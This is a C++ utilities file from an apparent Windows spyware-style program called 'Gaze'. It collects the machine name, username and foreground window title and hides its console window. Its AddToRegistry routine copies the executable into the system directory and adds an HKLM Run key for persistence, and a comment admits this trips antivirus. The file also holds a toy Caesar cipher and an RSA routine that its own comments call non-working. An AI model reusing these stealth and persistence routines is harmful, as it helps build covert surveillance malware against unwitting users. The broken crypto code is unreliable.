#include "pch.h"
#include <iostream>
#include <stdlib.h>
#include <math.h>
#include "Utilities.h"

using namespace std;


////////////////////////////////////////////////////////
// Utilities functions not part of the utilities class
////////////////////////////////////////////////////////

// Check if is a prime number
bool isPrime(unsigned long int nb)
{
	unsigned long int root = sqrt(nb);

	for (int i = 2; i <= root; ++i)
	{

		if (nb % i == 0)
			return false; // Is not prime
	}

	// Is prime
	return true;
};

// Check if "possible is a factor of "value"
bool isFactorOf(unsigned long int possible, unsigned long int value)
{
	for (int i = 1; i <= value; ++i)
	{
		if (value % i == 0) // There for "i" is a factor of "value"
		{
			if (i == possible)
				return true; // Then "possible" is a factor of "value"
		}
	}

	// If went this far "possible" is not a factor of "value"
	return false;
};

// Returns gcd of a and h
int gcd(int a, int h)
{
	int temp;
	while (1)
	{
		temp = a % h;
		if (temp == 0)
			return h;
		a = h;
		h = temp;
	}
};

/////////////////////////////////////////////////////////
// Note : In order to accept TCHAR conversion to
//        string in visual studio we must change
//        the Character Set in the project
//        properties to : Use Multy-Bite Character Set
/////////////////////////////////////////////////////////

// GetMachineName() : Return the machine name of the computer running this program
string Utilities::GetMachineName()
{
	string name;
	TCHAR buffer[INFO_BUFFER_SIZE];
	DWORD buffer_char_count = INFO_BUFFER_SIZE;

	if (!GetComputerName(buffer, &buffer_char_count))
		return "0"; // Failed to retrive machine name

	name = buffer;
	return name;
}

// GetUsername() : Return the user name of the user runnig this program
string Utilities::GetUsername()
{
	char buffer[256];
	DWORD buffer_size = 256;

	if (!GetUserName(buffer, &buffer_size))
		return "0"; // Failed to retrive username

	return buffer;
}

// GetActiveWindow() : Return the title of the current active window displayed on screen
string Utilities::GetActiveWindow()
{
	char buffer[256];
	
	if(!GetWindowText(GetForegroundWindow(), buffer, sizeof(buffer)))
		return "0"; // Failed to retrive window text
	return buffer;
}

//  GetSystemDir() : Return the path of the system directory
string Utilities::GetSystemDir()
{
	char buffer[256];
	if (!GetSystemDirectory(buffer, sizeof(buffer)))
		return "0"; // Failed to retrive system directory path

	return buffer;
}

// GetProgramFilePath() : Return the program file path
string Utilities::GetProgramFilePath()
{
	// Get the program handle and store it module_handle
	HMODULE module_handle = GetModuleHandle(NULL);

	char buffer[256];
	GetSystemDirectory(buffer, sizeof(buffer));

	// Get the program path and file name
	GetModuleFileName(module_handle, buffer, sizeof(buffer));

	return buffer;
}

// GetCurrentDate() :  Return the current date in a string format
string Utilities::GetCurrentDate()
{
	time_t now = time(0); // Get actual timestamp
	tm *tm_struct = localtime(&now); // Format timestamp into a tm_struct
	char buffer[80];

	// http://en.cppreference.com/w/cpp/chrono/c/strftime
	strftime(buffer, sizeof(buffer), "%Y-%m-%d", tm_struct);

	return buffer;
}

// GetTime() : Return the current time in a string
string Utilities::GetTime()
{
	time_t now = time(0); // Get actual timestamp
	tm *tm_struct = localtime(&now); // Format timestamp into a tm_struct
	char buffer[80];

	// http://en.cppreference.com/w/cpp/chrono/c/strftime
	strftime(buffer, sizeof(buffer), "%X", tm_struct);

	return buffer;
}

// HideConsole() : Hide the program console window
void Utilities::HideConsole()
{
	AllocConsole(); // Allocate a console to the program process
	HWND console = FindWindow("ConsoleWindowClass", NULL); // Return the console handler
	ShowWindow(console, 0); // Hide it
}

// AddToRegistry() : Add this program to the registry (Will trigger most anti-virus)
// Currently not working properly and triggering a windoes error 5 "access denied"
bool Utilities::AddToRegistry()
{
	// Note MAX_PATH define in minwindef.h (part of the includes in the Utilities.h)
	char program_path[MAX_PATH];
	char system_path[MAX_PATH];

	// Get the program handle and store it module_handle
	HMODULE module_handle = GetModuleHandle(NULL);

	// Get the program path and file name
	GetModuleFileName(module_handle, program_path, sizeof(program_path));
	// Get system directory
	GetSystemDirectory(system_path, sizeof(system_path));
	// Append new file name to system_path
	// strcat_s(system_path, "\\Gaze.exe");

	if (!CopyFile(program_path, system_path, false))
	{
		cout << GetLastError() << endl << program_path << endl << system_path << endl;
		return false; // if failed to copy to new location
	}

	// Create key and assign it to registry 
	HKEY key;
	LONG regOpn = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &key);

	if (regOpn == ERROR_SUCCESS)
	{
		cout << "Successfully opened the registery" << endl;
		RegSetValueEx(key, "GAZE_REG", 0, REG_SZ, (const unsigned char*)system_path, sizeof(system_path));
	}
	else
	{
		cout << "Failed to open the registery!" << endl;
	}

	RegCloseKey(key);
	return true;
}

// CaesarCypherEncrypt(string, int) :
string Utilities::CaesarCypherEncrypt(string content,int key)
{
	for (int i = 0; i < content.length(); i++)
		content[i] = content[i] + key; // The key for encryption that is added to ASCII value

	cout << "Encrypted string: " << content << endl;

	return content;
}

// CaesarCypherDecrypt(string, int) :
string Utilities::CaesarCypherDecrypt(string content, int key)
{
	for (int i = 0; i < content.length(); i++)
		content[i] = content[i] - key; // The key for encryption that is added to ASCII value

	cout << "Decrypted string: " << content << endl;

	return content;
}

// Doesn't work !! :(
// RSA Encrypt & Decrypt (string, unsigned long int, unsigned long int) :
string Utilities::RSA_Encrypt(string content, unsigned long int prime1, unsigned long int prime2)
{
	vector<double> temp;

	// Make sure both keys a prime numbers
	if (!isPrime(prime1) && !isPrime(prime2))
	{
		return "Must be prime numbers";
	}
	else
	{
		// Create first part of public key
		unsigned long int publicKey1 = prime1 * prime2; // n = P*Q


		unsigned long int e = 2; // e is a small exponent that stands for encrypt
		unsigned long int phi = (prime1 - 1) * (prime2 - 1); // O(n) = (P-1)(Q-1)

		// Must find other part of public key 
		while (e < phi)
		{
			// e must be co-prime to phi and 
			// smaller than phi. 
			if (gcd(e, phi) == 1) // To be honest not quit sure what gcd really those here
				break;
			else
				++e;
		}

		// Private key (d stands for decrypt) 
		// choosing d such that it satisfies 
		// d*e = 1 + k * totient 
		int k = 2; // Constant value
		double d = ((k*phi) + 1) / e;

		double msg = 200;
		double c = pow(msg, e);
		c = fmod(c, publicKey1);
		cout << "Encrypted : " << c << endl;

		double m = pow(c, d);
		m = fmod(m, publicKey1);
		cout << "decrypted : " << m << endl;
		
		/*
		// Encryption c = (msg ^ e) % n 
		for (int i = 0; i < content.size(); ++i)
		{
			double c = pow(content[i], e);
			c = fmod(c, publicKey1);

			temp.push_back(c);
		}
		cout << "Encrypted : " << endl;
		for (auto it = temp.begin(); it != temp.end(); ++it)
		{
			cout << *it;
		}


		// Decryption m = (c ^ d) % n 
		string decrypted;
		for (auto it = temp.begin(); it != temp.end(); ++it)
		{
			double m = pow(*it, d);
			m = fmod(m, publicKey1);
			decrypted.push_back(a);
		}

		cout << endl << "Decrypted : " << decrypted << endl;
		*/
		return content;
	}
}